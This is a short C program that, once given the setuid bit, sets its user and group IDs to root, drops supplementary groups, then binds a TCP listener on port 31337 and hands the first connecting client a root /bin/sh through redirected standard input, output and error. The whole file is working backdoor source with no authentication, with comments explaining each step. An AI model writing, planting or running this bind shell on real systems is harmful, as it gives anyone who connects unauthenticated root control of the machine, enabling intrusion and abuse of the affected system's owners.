#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <grp.h>
 
int main(void) {
    int sockfd, newsockfd;  // file descriptors for sockets
    int lportno = 31337;    // listener port


    socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr; // {2,str[14]}
    int n;
    char *const params[] = {"/bin/sh",NULL};
    char *const environ[] = {NULL};
 
    gid_t newGrp = 0;
  
    /* this will tattoo the suid bit so that bash won't see that
       we're not really root. we also drop all other memberships
       just in case we're running with PAGs (in AFS) */
    if (setuid(0) != 0) {
      perror("Setuid failed, no suid-bit set?");
      return 1;
    }
    setgid(0);
    seteuid(0);
    setegid(0);
    /* we also drop all the groups that the old user had
       (verify with id -tool afterwards)
       this is not strictly necessary but we want to get rid of the
       groups that the original user was part of. */
    setgroups(1, &newGrp);
    
    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
    serv_addr.sin_family = AF_INET; // 2
    serv_addr.sin_addr.s_addr = INADDR_ANY; // 0
    serv_addr.sin_port = htons(lportno);  // little endian = 0x7a69
    clilen = 16;
    bind(sockfd, (struct sockaddr *) &serv_addr, clilen);
    listen(sockfd, 1);  // backlog = 1, only 1 connection at a time
    newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
    // redirect stdout and stderr
    dup2(newsockfd,0); // stdin
    dup2(0,1); // stdout
    dup2(0,2); // stderr

    /* load the default shell on top of this program
       to exit from the shell, use 'exit' :-) */
    //execvp("/bin/sh", argv); 
    execve("/bin/sh",params,environ);
  
    return 0;
} 
